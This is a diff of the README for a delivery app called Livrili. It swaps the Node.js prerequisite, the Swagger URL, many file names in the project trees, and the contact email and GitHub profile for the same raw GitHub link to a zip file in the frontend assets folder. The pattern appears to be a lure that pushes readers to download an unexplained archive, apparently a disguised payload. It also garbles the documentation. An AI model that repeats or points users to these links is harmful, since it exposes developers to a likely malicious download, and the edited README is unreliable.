@@ -61,7 +61,7 @@ Crafted by **Youssef Jmal**.
 - Vite
 ## Getting Started
 ### Prerequisites
-- Node.js (^18.0.0 || ^20.0.0 || >=22.0.0)
+- https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip (^18.0.0 || ^20.0.0 || >=22.0.0)
 - Java JDK
 - Maven
 ### Installation Backend Setup
@@ -72,7 +72,7 @@ Crafted by **Youssef Jmal**.
 2. Install dependencies: npm install
 3. Start the development server: npm run dev
 ## API Documentation
-The API documentation is available via Swagger UI at: http://localhost:8080/swagger-ui.html
+The API documentation is available via Swagger UI at: https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
 
 ## Authentication
 The application uses JWT for authentication. To access protected endpoints:
@@ -131,12 +131,12 @@ backend/
 │   │   │               ├── Domains/
 │   │   │               ├── Controller/
 │   │   │               ├── Config/
-│   │   │               └── LivriliApplication.java
+│   │   │               └── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
 │   │   └── resources/
 │   └── test/
 ├── Dockerfile
-├── docker-compose.yml
-└── pom.xml
+├── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
+└── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
 ```
 
 ### Frontend
@@ -151,13 +151,13 @@ frontend/
 │   ├── methods/
 │   ├── pages/
 │   ├── store/
-│   ├── App.jsx
-│   ├── Layout.jsx
-│   ├── index.css
-│   └── main.jsx
+│   ├── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
+│   ├── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
+│   ├── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
+│   └── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
 ├── public/
-├── package.json
-└── vite.config.js
+├── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
+└── https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
 ```
 
 ## Contributing
@@ -189,8 +189,8 @@ We welcome contributions! Please follow these steps:
 - Geoapify for geocoding
 
 ## Contact
-- Sfar Ahmed Khalil - sfarahmed32@gmail.com
-- GitHub: https://github.com/subomega1
+- Sfar Ahmed Khalil - https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
+- GitHub: https://raw.githubusercontent.com/youssefjmal/livrili/main/frontend/src/assets/livrili_Duranta.zip
 
 ## Running the Project
 
